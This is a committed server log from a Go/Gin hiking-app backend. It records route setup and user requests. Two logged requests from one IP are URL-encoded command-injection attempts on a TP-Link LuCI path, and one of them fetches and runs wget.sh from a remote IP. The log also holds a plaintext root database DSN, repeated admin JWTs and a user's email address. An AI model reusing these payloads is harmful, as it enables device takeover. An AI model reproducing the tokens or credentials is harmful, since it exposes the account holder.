@@ -1,0 +1,187 @@
+nohup: ignoring input
+DSN: host=localhost user=root password=root dbname=db port=6500 sslmode=disable TimeZone=Europe/Paris
+Connected to DB :  &{0xc0000f0090 <nil> 0 0xc000007880 1}
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+[GIN-debug] GET    /images/*filepath         --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (4 handlers)
+[GIN-debug] HEAD   /images/*filepath         --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (4 handlers)
+[GIN-debug] GET    /gpx/*filepath            --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (4 handlers)
+[GIN-debug] HEAD   /gpx/*filepath            --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (4 handlers)
+[GIN-debug] GET    /swagger/*any             --> github.com/swaggo/gin-swagger.CustomWrapHandler.func1 (4 handlers)
+[GIN-debug] POST   /signup                   --> backend/controllers.Signup (4 handlers)
+CORS middleware
+[GIN-debug] POST   /login                    --> backend/controllers.Login (5 handlers)
+[GIN-debug] GET    /logout                   --> backend/controllers.Logout (4 handlers)
+[GIN-debug] PATCH  /validate                 --> backend/controllers.Validate (4 handlers)
+[GIN-debug] GET    /users                    --> backend/controllers.GetUsers (5 handlers)
+[GIN-debug] PATCH  /users/:id/role           --> backend/controllers.UpdateRole (5 handlers)
+[GIN-debug] DELETE /users/:id                --> backend/controllers.DeleteUser (5 handlers)
+[GIN-debug] POST   /hikes                    --> backend/controllers.CreateHike (4 handlers)
+[GIN-debug] GET    /hikes                    --> backend/controllers.GetAllHikes (4 handlers)
+[GIN-debug] GET    /hikes/:id                --> backend/controllers.GetHike (4 handlers)
+[GIN-debug] GET    /hikes/notValidated       --> backend/controllers.GetNoValitedHike (5 handlers)
+[GIN-debug] PUT    /hikes/:id                --> backend/controllers.UpdateHike (4 handlers)
+[GIN-debug] PATCH  /hikes/:id/validate       --> backend/controllers.ValidateHike (5 handlers)
+[GIN-debug] DELETE /hikes/:id                --> backend/controllers.DeleteHike (4 handlers)
+[GIN-debug] POST   /advice                   --> backend/controllers.CreateAdvice (5 handlers)
+[GIN-debug] GET    /advice/:id/receiver      --> backend/controllers.GetAdviceByReceiver (5 handlers)
+[GIN-debug] GET    /advice/:id/donor         --> backend/controllers.GetAdviceByDonor (5 handlers)
+[GIN-debug] PATCH  /advice/:id               --> backend/controllers.UpdateAdvice (5 handlers)
+[GIN-debug] DELETE /advice/:id               --> backend/controllers.DeleteAdvice (5 handlers)
+[GIN-debug] POST   /groups                   --> backend/controllers.CreateGroup (5 handlers)
+[GIN-debug] POST   /groups/join              --> backend/controllers.JoinGroup (5 handlers)
+[GIN-debug] GET    /groups/user/:id          --> backend/controllers.GetMyGroups (5 handlers)
+[GIN-debug] GET    /groups/:id               --> backend/controllers.GetGroup (5 handlers)
+[GIN-debug] GET    /groups                   --> backend/controllers.GetGroups (5 handlers)
+[GIN-debug] GET    /groups/hike/:id/:userId  --> backend/controllers.GetGroupsByHike (5 handlers)
+[GIN-debug] PATCH  /groups/:id               --> backend/controllers.UpdateGroup (4 handlers)
+[GIN-debug] PATCH  /groups/validate/:id      --> backend/controllers.ValidateUserGroup (4 handlers)
+[GIN-debug] DELETE /groups/:id               --> backend/controllers.DeleteGroup (4 handlers)
+[GIN-debug] DELETE /groups/leave             --> backend/controllers.LeaveGroup (4 handlers)
+[GIN-debug] POST   /reviews                  --> backend/controllers.CreateReview (4 handlers)
+[GIN-debug] PUT    /reviews/:id              --> backend/controllers.UpdateReview (4 handlers)
+[GIN-debug] GET    /reviews/hike/:hike_id    --> backend/controllers.GetReviewsByHike (4 handlers)
+[GIN-debug] GET    /reviews/user/:user_id/hike/:hike_id --> backend/controllers.GetReviewByUser (4 handlers)
+[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
+[GIN-debug] Environment variable PORT is undefined. Using port :8080 by default
+[GIN-debug] Listening and serving HTTP on :8080
+[GIN] 2024/07/12 - 21:29:34 | 200 |    1.660678ms |      90.3.90.39 | GET      "/hikes"
+[GIN] 2024/07/12 - 21:29:34 | 200 |     766.406µs |      90.3.90.39 | GET      "/hikes"
+[GIN] 2024/07/12 - 21:29:42 | 200 |    1.202978ms |      90.3.90.39 | GET      "/hikes"
+[GIN] 2024/07/12 - 21:29:43 | 200 |     682.803µs |      90.3.90.39 | GET      "/hikes"
+[GIN] 2024/07/12 - 21:32:43 | 404 |     218.731µs |   45.148.10.202 | GET      "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60)"
+[GIN] 2024/07/12 - 21:32:43 | 404 |     114.985µs |   45.148.10.202 | GET      "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60)"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723410083e+09 roles:admin sub:1 verified:true] [210 171 171 107 220 143 187 49 238 70 225 173 225 133 191 106 83 118 90 242 23 22 225 51 99 12 57 188 95 20 29 135] true}
+[GIN] 2024/07/12 - 21:45:05 | 200 |    9.081683ms |      90.3.90.39 | GET      "/groups/user/1"
+[GIN] 2024/07/12 - 21:45:06 | 200 |     837.325µs |      90.3.90.39 | GET      "/hikes"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723410083e+09 roles:admin sub:1 verified:true] [210 171 171 107 220 143 187 49 238 70 225 173 225 133 191 106 83 118 90 242 23 22 225 51 99 12 57 188 95 20 29 135] true}
+[GIN] 2024/07/12 - 21:45:07 | 200 |    3.647588ms |      90.3.90.39 | GET      "/groups/user/1"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723410083e+09 roles:admin sub:1 verified:true] [210 171 171 107 220 143 187 49 238 70 225 173 225 133 191 106 83 118 90 242 23 22 225 51 99 12 57 188 95 20 29 135] true}
+[GIN] 2024/07/12 - 21:45:10 | 200 |    3.238452ms |      90.3.90.39 | GET      "/groups/user/1"
+[GIN] 2024/07/12 - 21:45:11 | 200 |     792.483µs |      90.3.90.39 | GET      "/hikes"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723410083e+09 roles:admin sub:1 verified:true] [210 171 171 107 220 143 187 49 238 70 225 173 225 133 191 106 83 118 90 242 23 22 225 51 99 12 57 188 95 20 29 135] true}
+[GIN] 2024/07/12 - 21:45:12 | 200 |    3.007865ms |      90.3.90.39 | GET      "/groups/user/1"
+[GIN] 2024/07/12 - 21:45:13 | 200 |    5.134216ms |      90.3.90.39 | GET      "/gpx/at_rando_corse_gorge_de_la_restonica-17800975-1720812289-744.gpx"
+[GIN] 2024/07/12 - 21:45:15 | 200 |     888.283µs |      90.3.90.39 | GET      "/hikes"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723410083e+09 roles:admin sub:1 verified:true] [210 171 171 107 220 143 187 49 238 70 225 173 225 133 191 106 83 118 90 242 23 22 225 51 99 12 57 188 95 20 29 135] true}
+[GIN] 2024/07/12 - 21:45:16 | 200 |    2.867462ms |      90.3.90.39 | GET      "/groups/user/1"
+[GIN] 2024/07/12 - 21:45:17 | 200 |     889.847µs |      90.3.90.39 | GET      "/hikes"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEwMDgzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.0qura9yPuzHuRuGt4YW_alN2WvIXFuEzYww5vF8UHYc 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723410083e+09 roles:admin sub:1 verified:true] [210 171 171 107 220 143 187 49 238 70 225 173 225 133 191 106 83 118 90 242 23 22 225 51 99 12 57 188 95 20 29 135] true}
+[GIN] 2024/07/12 - 21:45:19 | 200 |    2.668586ms |      90.3.90.39 | GET      "/groups/hike/1/1"
+[GIN] 2024/07/12 - 21:45:19 | 200 |     560.525µs |      90.3.90.39 | GET      "/gpx/boucle_mont_vial_col_vialtoudon-18902961-1720261795-233.gpx"
+
+2024/07/12 21:45:19 [31;1m/home/debian/challenge2-5iw/backend/controllers/reviewController.go:93 [35;1mrecord not found
+[0m[33m[1.494ms] [34;1m[rows:0][0m SELECT * FROM "reviews" WHERE user_id = 1 AND hike_id = 1 ORDER BY "reviews"."id" LIMIT 1
+[GIN] 2024/07/12 - 21:45:19 | 500 |     1.88997ms |      90.3.90.39 | GET      "/reviews/user/1/hike/1"
+[GIN] 2024/07/12 - 21:45:36 | 404 |     146.078µs |    120.92.12.14 | GET      "/geoserver/web/"
+CORS middleware 2
+Email  Password  IsGoogle 
+user 1
+[GIN] 2024/07/12 - 21:46:33 | 200 |    3.484833ms |      90.3.90.39 | POST     "/login"
+[GIN] 2024/07/12 - 21:46:33 | 200 |     998.358µs |      90.3.90.39 | GET      "/hikes"
+[GIN] 2024/07/12 - 21:46:33 | 200 |     219.866µs |      90.3.90.39 | GET      "/images/AXIE.png"
+[GIN] 2024/07/12 - 21:46:33 | 200 |     396.569µs |      90.3.90.39 | GET      "/images/default_hikePicture.png"
+[GIN] 2024/07/12 - 21:46:33 | 200 |     239.501µs |      90.3.90.39 | GET      "/images/1000000021.jpg"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:46:35 | 200 |    3.160227ms |      90.3.90.39 | GET      "/groups/user/1"
+[GIN] 2024/07/12 - 21:46:37 | 200 |     373.418µs |      90.3.90.39 | GET      "/gpx/at_rando_corse_gorge_de_la_restonica-17800975-1720812289-744.gpx"
+[GIN] 2024/07/12 - 21:46:39 | 200 |     825.869µs |      90.3.90.39 | GET      "/hikes"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:46:40 | 200 |    2.700444ms |      90.3.90.39 | GET      "/groups/user/1"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:46:42 | 200 |    1.755775ms |      90.3.90.39 | GET      "/groups/user/1"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:46:45 | 200 |    2.737258ms |      90.3.90.39 | GET      "/groups/user/1"
+[GIN] 2024/07/12 - 21:46:46 | 200 |      794.23µs |      90.3.90.39 | GET      "/hikes"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:46:54 | 200 |     2.22477ms |      90.3.90.39 | GET      "/groups/user/1"
+[GIN] 2024/07/12 - 21:46:55 | 200 |      447.26µs |      90.3.90.39 | GET      "/gpx/boucle_mont_vial_col_vialtoudon-18902961-1720261795-233.gpx"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:47:04 | 200 |    2.753784ms |      90.3.90.39 | GET      "/groups/user/1"
+[GIN] 2024/07/12 - 21:47:05 | 200 |     723.448µs |      90.3.90.39 | GET      "/hikes"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:47:23 | 200 |    2.891298ms |      90.3.90.39 | GET      "/groups/user/1"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:47:32 | 200 |     2.77435ms |      90.3.90.39 | GET      "/groups/user/1"
+RequireAuth middleware
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8
+User found
+1
+yalicheff.sebastien@gmail.com
+&{eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InlhbGljaGVmZi5zZWJhc3RpZW5AZ21haWwuY29tIiwiZXhwIjoxNzIzNDEyNzkzLCJyb2xlcyI6ImFkbWluIiwic3ViIjoxLCJ2ZXJpZmllZCI6dHJ1ZX0.7FxvMSsLQTTBnDKM0TZgWjxSJx4mvjF9_1batndPrW8 0xc00011d218 map[alg:HS256 typ:JWT] map[email:yalicheff.sebastien@gmail.com exp:1.723412793e+09 roles:admin sub:1 verified:true] [236 92 111 49 43 11 65 52 193 156 50 140 209 54 96 90 60 82 39 30 38 190 49 125 255 86 218 182 119 79 173 111] true}
+[GIN] 2024/07/12 - 21:47:37 | 200 |    2.626666ms |      90.3.90.39 | GET      "/groups/user/1"
